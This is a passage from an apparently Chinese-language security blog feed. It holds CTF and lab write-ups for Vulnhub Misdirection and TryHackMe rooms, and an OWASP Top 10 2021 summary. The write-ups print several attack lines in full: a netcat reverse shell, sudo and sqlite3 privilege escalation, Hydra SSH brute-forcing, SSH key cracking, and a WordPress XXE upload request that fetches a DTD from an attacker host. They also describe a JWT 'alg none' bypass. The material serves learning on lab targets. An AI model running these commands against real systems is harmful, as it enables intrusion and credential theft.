sudo提权</strong></p><p><a href="https://gtfobins.github.io/gtfobins/sqlite3/#sudo">https://gtfobins.github.io/gtfobins/sqlite3/#sudo</a></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/-1/image-20231110224453906.png" alt="image-20231110224453906.png"></p><p>如以上执行无果</p><p>如下执行提权成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -u#-1 sqlite3 /dev/null <span class="hljs-string">&#x27;.shell /bin/sh&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_Misdirection</title>
    <link href="/2023/10/23/vulnhub-Misdirection/"/>
    <url>/2023/10/23/vulnhub-Misdirection/</url>
    
    <content type="html"><![CDATA[<h3 id="Vulnhub-Misdirection-1"><a href="#Vulnhub-Misdirection-1" class="headerlink" title="Vulnhub | Misdirection: 1"></a>Vulnhub | Misdirection: 1</h3><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ction/image-20231110170018913.png" alt="image-20231110170018913"></p><p><a href="https://benheater.com/vulnhub-misdirection-1/#privilege-escalation">https://benheater.com/vulnhub-misdirection-1/#privilege-escalation</a></p><p>nmap扫到8080开放 dirsearch 扫到大马，在web页面中弹回不来shell，使用以下命令弹回</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">x <span class="hljs-built_in">mkfifo</span> /tmp/f; nc &lt;LOCAL-IP&gt; &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; <span class="hljs-built_in">rm</span> /tmp/f<br>attack: nc -lvnp xxx<br></code></pre></td></tr></table></figure><p>sudo -l </p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> www-data on <span class="hljs-symbol">localhost:</span><br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span><br><br><span class="hljs-title class_">User</span> www-data may run the following commands on <span class="hljs-symbol">localhost:</span><br>    (brexit) <span class="hljs-symbol">NOPASSWD:</span> /bin/bash<br></code></pre></td></tr></table></figure><p>www-data可以用brexit的权限执行&#x2F;bin&#x2F;bash</p><p>提权命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -u brexit /bin/bash -<span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p>提到brexit用户</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span><br><span class="hljs-attribute">uid</span>=<span class="hljs-number">1000</span>(brexit) gid=<span class="hljs-number">1000</span>(brexit) groups=<span class="hljs-number">1000</span>(brexit),<span class="hljs-number">24</span>(cdrom),<span class="hljs-number">30</span>(dip),<span class="hljs-number">46</span>(plugdev),<span class="hljs-number">108</span>(lxd)<br></code></pre></td></tr></table></figure><p>属于lxd用户组，lxd是linux容器管理工具，提权方式百度lxd提权或看上方文档。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>tryhackme_John_Hammond</title>
    <link href="/2023/10/17/tryhackme-John-Hammond/"/>
    <url>/2023/10/17/tryhackme-John-Hammond/</url>
    
    <content type="html"><![CDATA[<h3 id="Basic-Penetration-Testing-John-Hammond"><a href="#Basic-Penetration-Testing-John-Hammond" class="headerlink" title="Basic Penetration Testing | John Hammond"></a><strong>Basic Penetration Testing | John Hammond</strong></h3><p>工具：enum4linux、smbclient、smbmap</p><p>nmap -sV $host</p><p>发现smb服务</p><p>扫出用户名 Anonymous</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/Hammond/image-20231015153020088.png" alt="image-20231015153020088"></p><p>匿名用户可以免密登录</p><p>smbclient &#x2F;&#x2F;10.10.35.79&#x2F;Anonymous</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/Hammond/image-20231015153628995.png" alt="image-20231015153628995"></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/Hammond/image-20231015153907373.png" alt="image-20231015153907373"></p><p>得到敏感信息  机主为Jan</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/Hammond/image-20231015153931809.png" alt="image-20231015153931809"></p><p>猜测用户名为jan  用hydra爆破ssh</p><p>hydra -l jan -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt ssh:&#x2F;&#x2F;10.10.35.79<img src="image-20231015154053830.png" alt="image-20231015154053830" style="zoom:67%;" /></p><p>ssh连上以后是一个低权用户</p><p>&#x2F;&#x2F;查到本地高权用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep <span class="hljs-built_in">sudo</span> /etc/group<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/Hammond/image-20231015155357668.png" alt="image-20231015155357668"></p><p>在home&#x2F;kay下找到.ssh目录 目录下有id_rsa</p><p>id_rsa的作用：可以破解出生成该私钥时所设置的口令</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/Hammond/image-20231015155418881.png" alt="image-20231015155418881"></p><p>但是以jan用户cat id_rsa的时候显示权限拒绝</p><p>于是尝试scp到本机，scp居然可以成功。</p><p>目前获得了kay用户的id_rsa 文件，以下是破解过程</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ssh2john thm_rsa<span class="hljs-selector-class">.orig</span> &gt; thm_rsa<span class="hljs-selector-class">.hash</span><br>john <span class="hljs-attr">--wordlist</span>=/usr/share/wordlists/rockyou<span class="hljs-selector-class">.txt</span> thm_rsa<span class="hljs-selector-class">.hash</span> <br></code></pre></td></tr></table></figure><p>破解出口令后再次以jan权限登录  </p><p><strong>低权ssh连高权，该高权用户配置过公私钥，有私钥文件的情况下，输入以下这条命令，然后输入破解出的生成该私钥时所设置的口令即可连接高权用户。</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ssh -i <span class="hljs-regexp">/home/</span>kay<span class="hljs-regexp">/.ssh/i</span>d_rsa kay@<span class="hljs-number">10.10</span>.<span class="hljs-number">35.79</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>OWASP_Top_10-2021_总结</title>
    <link href="/2023/10/09/OWASP-Top-10-2021-%E6%80%BB%E7%BB%93/"/>
    <url>/2023/10/09/OWASP-Top-10-2021-%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h3 id="OWASP-Top-10-2021"><a href="#OWASP-Top-10-2021" class="headerlink" title="OWASP Top 10 - 2021"></a>OWASP Top 10 - 2021</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">Broken </span>Access Control    访问控制<br>Cryptographic Failures   加密失败<br>Injection <br><span class="hljs-keyword">Insecure </span>Design    不安全的设计<br>Security Misconfiguration    安全配置错误<br>Vulnerable <span class="hljs-keyword">and </span>Outdated Components    易受攻击和过时的组件<br>Identification <span class="hljs-keyword">and </span>Authentication Failures    标识和身份验证失败<br>Software <span class="hljs-keyword">and </span>Data Integrity Failures     软件和数据完整性故障<br>Security Logging &amp; Monitoring Failures    安全日志记录和监视失败<br>Server-Side Request Forgery (SSRF)     服务器端请求伪造 （SSRF）<br><br></code></pre></td></tr></table></figure><h4 id="访问控制失败"><a href="#访问控制失败" class="headerlink" title="访问控制失败"></a>访问控制失败</h4><p>不安全的直接对象引用（Insecure direct object references，IDOR）</p><p>例子：yotube私密视频读取逐帧 拼成视频</p><h4 id="加密失败"><a href="#加密失败" class="headerlink" title="加密失败"></a>加密失败</h4><p>加密故障漏洞是指滥用（或不使用）加密算法来保护敏感信息的漏洞。</p><p>通常会导致 Web 应用意外泄露敏感数据。这通常是与客户直接相关的数据（例如姓名、出生日期、财务信息），但也可能是更具技术性的信息，例如用户名和密码。</p><p>在更复杂的级别上，利用某些加密故障通常涉及诸如“中间人攻击”之类的技术，攻击者会强制用户通过他们控制的设备进行连接。</p><p>当我们加密客户端和服务器之间的网络流量时，将其称为<strong>加密传输中的数据</strong></p><p>电子邮件在存储在服务器上时也可能被加密。这称为<strong>静态加密数据</strong></p><p>hash破解网站  <a href="https://crackstation.net/">https://crackstation.net/</a></p><p>.db文件的使用</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">得到一个webapp.db<br><span class="hljs-comment">#file webapp.db </span><br>webapp.db: SQLite 3.x database, last written using SQLite version 3022000, file counter 255, database pages 7, 1st free page 5, free pages 1, cookie 0x6, schema 4, UTF-8, version-valid-for 255<br><span class="hljs-comment"># sqlite3 webapp.db </span><br>SQLite version 3.40.1 2022-12-28 14:03:47<br>Enter <span class="hljs-string">&quot;.help&quot;</span> for usage hints.<br>sqlite&gt; .tables<br>sessions  users   <br>sqlite&gt; PRAGMA table_info(users);<br>0|<span class="hljs-string">userID</span>|<span class="hljs-string">TEXT</span>|<span class="hljs-string">1</span>||1<br>1|<span class="hljs-string">username</span>|<span class="hljs-string">TEXT</span>|<span class="hljs-string">1</span>||0<br>2|<span class="hljs-string">password</span>|<span class="hljs-string">TEXT</span>|<span class="hljs-string">1</span>||0<br>3|<span class="hljs-string">admin</span>|<span class="hljs-string">INT</span>|<span class="hljs-string">1</span>||0<br>sqlite&gt; SELECT <span class="hljs-symbol">*</span> FROM users;<br>4413096d9c933359b898b6202288a650|<span class="hljs-string">admin</span>|<span class="hljs-string">6eea9b7ef19179a06954edd0f6c05ceb</span>|1<br>23023b67a32488588db1e28579ced7ec|<span class="hljs-string">Bob</span>|<span class="hljs-string">ad0234829205b9033196ba818f7a872b</span>|1<br>4e8423b514eef575394ff78caed3254d|<span class="hljs-string">Alice</span>|<span class="hljs-string">268b38ca7b84f44fa0a6cdc86e6301e0</span>|0<br></code></pre></td></tr></table></figure><h4 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h4><ul><li><p>SQL <strong>注入：</strong>当用户控制的输入传递给 SQL 查询时，会发生这种情况。因此，攻击者可以传入 SQL 查询来操纵此类查询的结果。当此输入传递到数据库查询时，这可能允许攻击者访问、修改和删除数据库中的信息。这意味着攻击者可以窃取敏感信息，例如个人详细信息和凭据。</p></li><li><p><strong>命令注入：</strong>当用户输入传递给系统命令时，会发生这种情况。因此，攻击者可以在应用程序服务器上执行任意系统命令，从而可能允许它们访问用户的系统。</p><h6 id="注入的防护"><a href="#注入的防护" class="headerlink" title="注入的防护"></a>注入的防护</h6><ul><li><strong>使用允许输入的列表：</strong>当输入发送到服务器时，此输入将与安全输入或字符列表进行比较。如果输入被标记为安全，则对其进行处理。否则，它将被拒绝，并且应用程序将引发错误。</li><li><strong>去除输入：</strong> 如果输入包含危险字符，则在处理之前会删除这些字符。</li></ul></li></ul><h4 id="不安全的设计"><a href="#不安全的设计" class="headerlink" title="不安全的设计"></a>不安全的设计</h4><p>e.g.不安全的密码重置</p><p>逻辑漏洞</p><h4 id="安全配置错误"><a href="#安全配置错误" class="headerlink" title="安全配置错误"></a>安全配置错误</h4><p>安全配置错误与其他前 10 大漏洞不同，因为它们发生在安全性本可以适当配置但未正确配置的情况下。即使您下载了最新的软件，糟糕的配置也可能使您的安装容易受到攻击。</p><p>安全错误配置包括：</p><ul><li>云服务（如 S3 存储桶）的权限配置不当。</li><li>启用不必要的功能，例如服务、页面、帐户或权限。</li><li>密码未更改的默认帐户。</li><li>错误消息过于详细，允许攻击者了解有关系统的更多信息。</li><li>不使用 <a href="https://owasp.org/www-project-secure-headers/">HTTP 安全标头</a>。</li></ul><p>此漏洞通常会导致更多漏洞，例如允许您访问敏感数据的默认凭据、XML 外部实体 （XXE） 或管理页面上的命令注入。</p><h4 id="易受攻击和过时的组件"><a href="#易受攻击和过时的组件" class="headerlink" title="易受攻击和过时的组件"></a>易受攻击和过时的组件</h4><p>通用组件漏洞</p><h4 id="识别和身份验证失败"><a href="#识别和身份验证失败" class="headerlink" title="识别和身份验证失败"></a>识别和身份验证失败</h4><p>如果攻击者能够发现身份验证机制中的缺陷，他们可能会成功访问其他用户的帐户。这将允许攻击者访问敏感数据。</p><p>身份验证机制中的一些常见缺陷包括：</p><ul><li><strong>暴力攻击：</strong>如果 Web 应用程序使用用户名和密码，攻击者可以尝试发起暴力攻击，允许他们使用多次身份验证尝试来猜测用户名和密码。</li><li><strong>使用弱凭据：</strong>Web 应用程序应设置强密码策略。如果应用程序允许用户设置密码（如“password1”）或常用密码，则攻击者可以很容易地猜到它们并访问用户帐户。</li><li><strong>弱会话 Cookie：</strong>会话 cookie 是服务器跟踪用户的方式。如果会话 Cookie 包含可预测的值，攻击者可以设置自己的会话 Cookie 并访问用户帐户。</li></ul><h4 id="软件和数据完整性故障"><a href="#软件和数据完整性故障" class="headerlink" title="软件和数据完整性故障"></a>软件和数据完整性故障</h4><h6 id="软件完整性"><a href="#软件完整性" class="headerlink" title="软件完整性"></a>软件完整性</h6><p>假设您有一个网站，它使用第三方库</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://code.jquery.com/jquery-3.6.1.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当用户导航到您的网站时，其浏览器将读取其 HTML 代码并从指定的外部源下载 jQuery。</p><p>如果攻击者以某种方式入侵jQuery官方存储库，他们可能会更改内容以注入恶意代码。因此，任何访问您网站的人现在都会在不知不觉中提取恶意代码并将其执行到他们的浏览器中。这是一个软件完整性失败，因为您的网站没有对第三方库进行检查以查看它是否已更改。现代浏览器允许您沿库的 URL 指定哈希值，以便仅当下载文件的哈希值与预期值匹配时才执行库代码。这种安全机制称为子资源完整性 （SRI）</p><p>在 HTML 代码中插入库的正确方法是使用 SRI 并包含完整性哈希，这样，如果攻击者能够以某种方式修改库，则浏览您网站的任何客户端都不会执行修改后的版本。以下是它在 HTML 中的样子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://code.jquery.com/jquery-3.6.1.min.js&quot;</span> <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=&quot;</span> <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以转到 <a href="https://www.srihash.org/">https://www.srihash.org/</a> 为任何库生成哈希值。</p><h6 id="数据完整性"><a href="#数据完整性" class="headerlink" title="数据完整性"></a>数据完整性</h6><p>如果用户篡改 cookie 并更改用户名，他们可能会冒充其他人并阅读他们的信息！此应用程序将遭受数据完整性故障，因为它信任攻击者可以篡改的数据。</p><p><strong>JWT</strong>！！！</p><p>一种解决方案是使用某种完整性机制来保证用户未更改 cookie——<strong>JSON Web 令牌 （JWT）。</strong></p><p>jwt安全原理：您可以生成令牌，您可以向用户提供这些令牌，以确保他们无法更改键值对并通过完整性检查。</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/21-%E6%80%BB%E7%BB%93/image-20231106222320145.png" alt="image-20231106222320145"></p><p>Header包含元数据，指示这是 JWT，并且使用的签名算法是 HS256。payload包含键值对，其中包含 Web 应用程序希望客户端存储的数据。Signature类似于哈希，用于验证payload的完整性。</p><p>如果更改payload，Web 应用程序可以验证Signature是否与payload不匹配，并知道您篡改了 JWT。与简单的哈希不同，此签名仅涉及使用服务器持有的密钥，这意味着<strong>如果您更改payload，除非您知道密钥，否则您将无法生成匹配的Signature。</strong></p><p>请注意，令牌的 3 个部分中的每一个都只是使用 base64 编码的纯文本</p><p>JWT也有漏洞，e.g.允许攻击者通过更改 JWT 中的以下两项内容来绕过签名验证：</p><ol><li><p>修改jwt的Header部分，以便标头包含值 。<code>alg none</code></p></li><li><p>删除签名部分。</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/21-%E6%80%BB%E7%BB%93/image-20231106224144037.png" alt="image-20231106224144037"></p></li></ol><h4 id="安全日志监控和记录失败"><a href="#安全日志监控和记录失败" class="headerlink" title="安全日志监控和记录失败"></a>安全日志监控和记录失败</h4><p>如果没有日志记录，就无法判断攻击者在获得对特定 Web 应用程序的访问权限时执行了哪些操作。这些更显著的影响包括：</p><ul><li><strong>监管损害：</strong>如果攻击者获得了对个人身份用户信息的访问权限，并且没有这方面的记录，则最终用户会受到影响，并且应用程序所有者可能会受到罚款或更严厉的处罚，具体取决于法规。</li><li><strong>进一步攻击的风险：</strong>如果不进行日志记录，攻击者的存在可能无法检测到。这可能允许攻击者通过窃取凭据、攻击基础设施等方式对 Web 应用程序所有者发起进一步攻击。</li></ul><p>日志中存储的信息应包括以下内容：</p><ul><li>HTTP 状态代码</li><li>时间戳</li><li>用户名</li><li>API 端点&#x2F;页面位置</li><li>IP 地址</li></ul><p>这些日志包含一些敏感信息，因此请务必确保它们安全存储，并且这些日志的多个副本存储在不同的位置。</p><h4 id="服务器端请求伪造-（SSRF）"><a href="#服务器端请求伪造-（SSRF）" class="headerlink" title="服务器端请求伪造 （SSRF）"></a>服务器端请求伪造 （SSRF）</h4><p>当攻击者可以强制 Web 应用程序代表他们向任意目标发送请求，同时控制请求本身的内容时，就会发生此类漏洞。SSRF 漏洞通常源于我们的 Web 应用程序需要使用第三方服务的实现。</p><p>危害场景</p><p>​        使用外部 API 向其客户端发送短信通知的 Web 应用程序。对于每封电子邮件，网站需要向 SMS 提供商的服务器发出 Web 请求，以发送要发送的消息内容。由于 SMS 提供商按消息收费，因此他们要求您添加一个密钥，该密钥是他们预先分配给您的，用于您向其 API 发出的每个请求。API 密钥用作身份验证令牌，并允许提供商知道向谁收取每条消息的费用。该应用程序将像这样工作：</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>tryhackme_wordpress_5.6.2</title>
    <link href="/2023/10/01/tryhackme-wordpress-5-6-2/"/>
    <url>/2023/10/01/tryhackme-wordpress-5-6-2/</url>
    
    <content type="html"><![CDATA[<h3 id="wordpress-5-6-2-xxe-wav文件上传"><a href="#wordpress-5-6-2-xxe-wav文件上传" class="headerlink" title="wordpress 5.6.2 xxe+wav文件上传"></a>wordpress 5.6.2 xxe+wav文件上传</h3><p><a href="https://blog.7sec.pw/thm-wordpress-cve-2021-29447">https://blog.7sec.pw/thm-wordpress-cve-2021-29447</a></p><p><a href="https://classroom.anir0y.in/post/tryhackme-wordpresscve202129447/">https://classroom.anir0y.in/post/tryhackme-wordpresscve202129447/</a></p><p>payload包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wp-admin/async-upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.38.200<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.38.200/wp-admin/media-new.php<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------340848750029926117942213750511<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>1092<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.10.38.200<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>wordpress_=test-corp%7C1697188180%7CrqNGHtlLtFyE1oh4k8CrJ6mPT9KuDtXDJKzXPL19VnL%7Ca45d1a9ba96bfb9d11a9ffff2fa8b97cf45b3847d61e81969b3f09288f93563a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_=test-corp%7C1697188180%7CrqNGHtlLtFyE1oh4k8CrJ6mPT9KuDtXDJKzXPL19VnL%7C0d4b7f7e8e2f4c8ace785f19e28cde18a88f543feabdc23360a4d61f124c44a5; wp-settings-time-2=1697015399<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;macOS&quot;<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;111&quot;, &quot;Chromium&quot;;v=&quot;111&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><br><span class="language-xml">-----------------------------340848750029926117942213750511</span><br><span class="language-xml">Content-Disposition: form-data; name=&quot;name&quot;</span><br><span class="language-xml"></span><br><span class="language-xml">poc.wav</span><br><span class="language-xml">-----------------------------340848750029926117942213750511</span><br><span class="language-xml">Content-Disposition: form-data; name=&quot;post_id&quot;</span><br><span class="language-xml"></span><br><span class="language-xml">0</span><br><span class="language-xml">-----------------------------340848750029926117942213750511</span><br><span class="language-xml">Content-Disposition: form-data; name=&quot;_wpnonce&quot;</span><br><span class="language-xml"></span><br><span class="language-xml">f62d479851</span><br><span class="language-xml">-----------------------------340848750029926117942213750511</span><br><span class="language-xml">Content-Disposition: form-data; name=&quot;type&quot;</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">-----------------------------340848750029926117942213750511</span><br><span class="language-xml">Content-Disposition: form-data; name=&quot;tab&quot;</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">-----------------------------340848750029926117942213750511</span><br><span class="language-xml">Content-Disposition: form-data; name=&quot;short&quot;</span><br><span class="language-xml"></span><br><span class="language-xml">1</span><br><span class="language-xml">-----------------------------340848750029926117942213750511</span><br><span class="language-xml">Content-Disposition: form-data; name=&quot;async-upload&quot;; filename=&quot;poc.wav&quot;</span><br><span class="language-xml">Content-Type: audio/x-wav</span><br><span class="language-xml"></span><br><span class="language-xml">RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span>[<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&#x27;&quot;&#x27;</span><span class="hljs-string">&quot;&#x27;http://10.2.73.2:4444/NAMEEVIL.dtd&#x27;&quot;</span><span class="hljs-string">&#x27;&quot;&#x27;</span>&gt;</span>%remote;%init;%trick;]&gt;</span>\x00</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">-----------------------------340848750029926117942213750511--</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>第一步先wpscan扫一下，扫出了版本 5.6.x 该版本存在xxe漏洞</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span 